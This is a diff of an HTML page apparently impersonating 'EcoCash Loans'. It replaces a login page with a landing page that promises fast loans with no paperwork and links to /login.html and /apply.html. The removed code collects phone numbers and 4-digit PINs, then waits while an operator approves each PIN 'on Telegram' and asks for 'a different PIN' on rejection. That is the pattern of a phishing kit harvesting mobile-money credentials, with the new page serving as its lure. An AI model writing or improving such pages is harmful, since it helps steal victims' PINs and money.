@@ -3,185 +3,102 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>EcoCash Loans - Login</title>
+<title>EcoCash Loans - Fast & Easy Loans</title>
 <style>
-  body { 
-    font-family: Arial, sans-serif; 
-    background: #0753a6; 
-    margin: 0; 
-    display: flex; 
-    justify-content: center; 
-    align-items: center; 
-    min-height: 100vh; 
-    padding: 20px;
-    box-sizing: border-box;
-  }
-  .card { 
-    background: #fff; 
-    padding: 30px; 
-    border-radius: 12px; 
-    width: 100%; 
-    max-width: 350px; 
-    box-shadow: 0 10px 25px rgba(0,0,0,0.2); 
-    text-align: center; 
-  }
-  h1 { color: #0753a6; margin-top: 0; font-size: 24px; }
-  p.subtitle { color: #666; font-size: 14px; margin-bottom: 20px; }
-  input { 
-    width: 100%; 
-    padding: 14px; 
-    margin: 8px 0; 
-    border: 1px solid #ccc; 
-    border-radius: 8px; 
-    box-sizing: border-box; 
-    font-size: 16px; 
-  }
-  input:focus { outline: none; border-color: #0753a6; }
-  button { 
-    width: 100%; 
-    padding: 14px; 
-    background: #0753a6; 
-    color: white; 
-    border: none; 
-    border-radius: 8px; 
-    font-size: 16px; 
-    font-weight: bold; 
-    cursor: pointer; 
-    transition: background 0.3s; 
-    margin-top: 15px; 
-  }
-  button:disabled { cursor: not-allowed; opacity: 0.8; }
-  #messageDiv { margin-top: 15px; font-size: 14px; min-height: 24px; font-weight: bold; }
-  .back-link { display: block; margin-top: 20px; color: #0753a6; text-decoration: none; font-size: 14px; }
-  .back-link:hover { text-decoration: underline; }
+  body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f4f7f6; color: #333; }
+  .header { background: #0753a6; color: white; padding: 20px; display: flex; justify-content: space-between; align-items: center; }
+  .header h1 { margin: 0; font-size: 22px; }
+  .header a { color: white; text-decoration: none; background: #13834b; padding: 10px 20px; border-radius: 6px; font-weight: bold; }
+  .hero { background: #0753a6; color: white; text-align: center; padding: 40px 20px; }
+  .hero h2 { margin-top: 0; font-size: 28px; }
+  .hero p { font-size: 16px; opacity: 0.9; margin-bottom: 20px; }
+  .hero button { background: #e6a800; color: #000; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 8px; cursor: pointer; }
+  .container { padding: 20px; max-width: 600px; margin: 0 auto; }
+  .card { background: white; padding: 20px; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+  .card h3 { margin-top: 0; color: #0753a6; }
+  .calculator input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+  .calc-result { background: #e8f4fc; padding: 15px; border-radius: 8px; margin-top: 15px; font-weight: bold; font-size: 18px; text-align: center; color: #0753a6; }
+  .steps { list-style: none; padding: 0; }
+  .steps li { margin-bottom: 15px; padding-left: 30px; position: relative; }
+  .steps li::before { content: '✅'; position: absolute; left: 0; top: 0; }
+  .footer { text-align: center; padding: 20px; color: #777; font-size: 14px; }
 </style>
 </head>
 <body>
 
-<div class="card">
+<div class="header">
   <h1>EcoCash Loans</h1>
-  <p class="subtitle">Sign in with your registered phone number and PIN.</p>
-  
-  <form id="loginForm">
-    <input type="text" id="phoneInput" placeholder="Zimbabwe phone number (e.g. 0771234567)" required>
-    <input type="password" id="pinInput" placeholder="4-digit PIN" maxlength="4" required>
-    
-    <button type="submit" id="loginBtn">LOGIN</button>
-  </form>
+  <a href="/login.html">Login</a>
+</div>
 
-  <div id="messageDiv"></div>
-  
-  <a href="/" class="back-link">Back to home</a>
+<div class="hero">
+  <h2>Fast, Easy Loans in Zimbabwe</h2>
+  <p>Get approved in minutes. No paperwork required.</p>
+  <button onclick="window.location.href='/apply.html'">Apply Now</button>
+</div>
+
+<div class="container">
+  <div class="card calculator">
+    <h3>Loan Calculator</h3>
+    <p style="font-size: 14px; color: #666; margin-bottom: 15px;">Estimate your monthly repayments.</p>
+    
+    <label>Loan Amount (USD)</label>
+    <input type="number" id="amountInput" placeholder="e.g. 1000" oninput="calculateLoan()">
+    
+    <label>Term (Months)</label>
+    <select id="termInput" onchange="calculateLoan()" style="width:100%; padding:12px; border:1px solid #ccc; border-radius:8px; font-size:16px; margin-bottom:10px;">
+      <option value="3">3 Months</option>
+      <option value="6">6 Months</option>
+      <option value="12">12 Months</option>
+      <option value="24">24 Months</option>
+    </select>
+
+    <div class="calc-result" id="resultDisplay">Monthly Repayment: $0.00</div>
+  </div>
+
+  <div class="card">
+    <h3>Our Loan Products</h3>
+    <div style="margin-bottom: 15px;">
+      <strong style="color: #13834b;">⚡ Emergency Loan</strong><br>
+      <span style="font-size: 14px; color: #666;">Up to $500 • 1 Month</span>
+    </div>
+    <div style="margin-bottom: 15px;">
+      <strong style="color: #13834b;">👤 Personal Loan</strong><br>
+      <span style="font-size: 14px; color: #666;">Up to $5,000 • 3 - 24 Months</span>
+    </div>
+    <div>
+      <strong style="color: #13834b;">💼 Business Loan</strong><br>
+      <span style="font-size: 14px; color: #666;">Up to $20,000 • 6 - 36 Months</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>How It Works</h3>
+    <ul class="steps">
+      <li><strong>Apply online:</strong> Fill in your details in under 2 minutes.</li>
+      <li><strong>Get verified:</strong> We review your application instantly.</li>
+      <li><strong>Receive funds:</strong> Once approved, we send the money directly to you.</li>
+    </ul>
+  </div>
+</div>
+
+<div class="footer">
+  &copy; 2026 EcoCash Loans. All rights reserved.
 </div>
 
 <script>
-document.getElementById('loginForm').addEventListener('submit', async (e) => {
-  e.preventDefault();
-
-  const phone = document.getElementById('phoneInput').value;
-  const pin = document.getElementById('pinInput').value;
-  const btn = document.getElementById('loginBtn');
-  const messageDiv = document.getElementById('messageDiv');
-  
-  // 1. Set button to loading state
-  btn.disabled = true;
-  btn.innerText = 'Submitting...';
-  messageDiv.innerText = '';
-  messageDiv.style.color = '#0753a6';
-
-  try {
-    const response = await fetch('/api/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ phone, pin })
-    });
-
-    const data = await response.json();
-
-    // 2. Handle Errors (Incorrect PIN, etc.)
-    if (!response.ok && response.status !== 202) {
-      messageDiv.style.color = 'red';
-      messageDiv.innerText = data.error || 'Login failed.';
-      resetBtn();
+  function calculateLoan() {
+    const amount = parseFloat(document.getElementById('amountInput').value) || 0;
+    const months = parseInt(document.getElementById('termInput').value) || 1;
+    const interestRate = 0.15;
+    if (amount <= 0) {
+      document.getElementById('resultDisplay').innerText = "Monthly Repayment: $0.00";
       return;
     }
-
-    // 3. Handle Success (Already Logged In)
-    if (data.authenticated) {
-      // NO REDIRECT. Just show success on screen.
-      btn.innerText = 'LOGIN SUCCESSFUL';
-      btn.style.backgroundColor = '#13834b'; // Green
-      messageDiv.style.color = 'green';
-      messageDiv.innerText = 'You are logged in successfully!';
-      return;
-    }
-
-    // 4. Handle Pending PIN Approval (Live Polling)
-    if (data.status === 'pending_pin_approval' && data.applicationId) {
-      btn.innerText = 'Waiting for Admin Approval...';
-      btn.style.backgroundColor = '#e6a800'; // Orange
-      startLivePolling(data.applicationId, btn, messageDiv);
-    }
-
-  } catch (err) {
-    messageDiv.style.color = 'red';
-    messageDiv.innerText = 'Network error. Please try again.';
-    resetBtn();
+    const totalRepayable = amount + (amount * interestRate);
+    const monthlyRepayment = totalRepayable / months;
+    document.getElementById('resultDisplay').innerText = `Monthly Repayment: $${monthlyRepayment.toFixed(2)}`;
   }
-
-  function resetBtn() {
-    btn.disabled = false;
-    btn.innerText = 'LOGIN';
-    btn.style.opacity = '1';
-  }
-});
-
-// --- THE LIVE POLLING FUNCTION ---
-function startLivePolling(applicationId, btn, messageDiv) {
-  // Animated dots for the text
-  let dots = 0;
-  const loadingInterval = setInterval(() => {
-    dots = (dots + 1) % 4;
-    messageDiv.innerText = 'Checking approval status' + '.'.repeat(dots);
-  }, 500);
-
-  // Check backend every 3 seconds
-  const pollInterval = setInterval(async () => {
-    try {
-      const res = await fetch(`/api/applications/${applicationId}/status`);
-      const statusData = await res.json();
-
-      if (!res.ok) return;
-
-      // Admin Approved on Telegram
-      if (statusData.pin_status === 'approved') {
-        clearInterval(loadingInterval);
-        clearInterval(pollInterval);
-        
-        messageDiv.style.color = 'green';
-        messageDiv.innerText = 'PIN Approved!';
-        btn.innerText = 'LOGIN SUCCESSFUL';
-        btn.style.backgroundColor = '#13834b'; // Green
-      }
-
-      // Admin Rejected on Telegram
-      if (statusData.pin_status === 'rejected') {
-        clearInterval(loadingInterval);
-        clearInterval(pollInterval);
-        
-        messageDiv.style.color = 'red';
-        messageDiv.innerText = 'Your PIN was rejected by support. Please try a different PIN.';
-        
-        btn.disabled = false;
-        btn.innerText = 'TRY AGAIN';
-        btn.style.backgroundColor = '#c83737'; // Red
-      }
-
-    } catch (err) {
-      // Ignore temporary network drops
-    }
-  }, 3000);
-}
 </script>
 </body>
-</html>
+        </html>
